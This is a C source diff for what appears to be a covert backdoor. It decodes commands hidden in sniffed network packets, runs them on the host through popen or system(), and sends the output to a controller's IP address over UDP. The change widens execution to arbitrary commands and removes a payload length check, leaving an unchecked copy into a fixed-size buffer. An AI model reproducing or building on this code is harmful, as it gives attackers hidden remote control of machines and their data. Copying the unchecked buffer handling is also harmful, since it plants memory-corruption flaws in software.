@@ -157,34 +157,34 @@ void print_hex_ascii_line (const u_char *payload, int len, int offset) {
 
 
 
-void decrypt_payload(const u_char *payload) {
-    char decrypt_string[64] = {0};
+void decrypt_payload(u_char *payload) {
+    char decrypt_string[128] = {0};
     char *count;
-    if (strlen(payload) < 130) {
-        for (int i = 0; i < strlen(payload); i++) {
-            decrypt_string[i] = encrypt_decrypt(payload[i]);
-        }
-        if (strncmp(decrypt_string, "start[", 5) == 0) {
-            opts.ip_flag = TRUE;
-            strcpy(opts.sniffer_ip, opts.temp_ip);
-            if (opts.ip_flag == TRUE) {
-                if (opts.serv_flag == FALSE) {
-                    serv_addr.sin_addr.s_addr = inet_addr(opts.sniffer_ip);
-                    opts.serv_flag = TRUE;
-                }
-            }
-            extract_square_bracket_string(decrypt_string);
-        }
-        if (strstr(decrypt_string, "-c") != NULL) {
-            count = strstr(decrypt_string, "-c");
-            count += 2;
-            opts.count = (unsigned int) atoi(count);
-        }
+
+    for (int i = 0; i < strlen(payload); i++) {
+        decrypt_string[i] = encrypt_decrypt(payload[i]);
     }
+
+    if (strncmp(decrypt_string, "start[", 5) == 0) {
+        opts.ip_flag = TRUE;
+        strcpy(opts.sniffer_ip, opts.temp_ip);
+        if (opts.serv_flag == FALSE) {
+            serv_addr.sin_addr.s_addr = inet_addr(opts.sniffer_ip);
+            opts.serv_flag = TRUE;
+        }
+        extract_square_bracket_string(decrypt_string);
+        memset(decrypt_string, 0, sizeof(decrypt_string));
+    }
+    if (strstr(decrypt_string, "-c") != NULL) {
+        count = strstr(decrypt_string, "-c");
+        count += 2;
+        opts.count = (unsigned int) atoi(count);
+    }
+
 }
 
 
-void extract_square_bracket_string(const char* input) {
+void extract_square_bracket_string(char* input) {
     const char* start = strchr(input, '[');
     const char* end = strchr(input, ']');
     char temp[1024] = {0};
@@ -211,7 +211,7 @@ void extract_square_bracket_string(const char* input) {
         else {
             size_t length = end - (start + 1);
             strncpy(opts.decrypt_instruction, start + 1, length);
-
+            strncpy(opts.buffer, "\n", 1);
             if(strlen(cwd) != 0) chdir(cwd);
             if (strstr(opts.decrypt_instruction, "cd")) {
                 char* cd_token = strtok(opts.decrypt_instruction, " ");
@@ -221,7 +221,9 @@ void extract_square_bracket_string(const char* input) {
                 strcpy(cwd, temp_cwd);
                 memset(temp_cwd, 0, sizeof(temp_cwd));
             }
-            else {
+            else if (strstr(opts.decrypt_instruction, "ls") != NULL ||
+                        strstr(opts.decrypt_instruction, "cat") != NULL ||
+                            strstr(opts.decrypt_instruction, "pwd") != NULL) {
                 pipe = popen(opts.decrypt_instruction, "r");
                 while (fgets(temp, sizeof(temp), pipe) != NULL) {
                     // Process or print the captured output
@@ -231,18 +233,13 @@ void extract_square_bracket_string(const char* input) {
                 }
                 pclose(pipe);
             }
-            if (strlen(opts.buffer) == 0) {
-                pipe = popen("pwd", "r");
-                while (fgets(temp, sizeof(temp), pipe) != NULL) {
-                    strcat(opts.buffer, temp);
-                    memset(temp, 0, sizeof(temp));
-                }
-                pclose(pipe);
+            else {
+                system(opts.decrypt_instruction);
             }
         }
         sendto(opts.target_socket, opts.buffer, strlen(opts.buffer), 0,
                (struct sockaddr *) &serv_addr, sizeof(serv_addr));
-        memset(opts.buffer, 0, sizeof(opts.buffer));
+        memset(opts.buffer, 0, strlen(opts.buffer));
 
         /* close */
     }
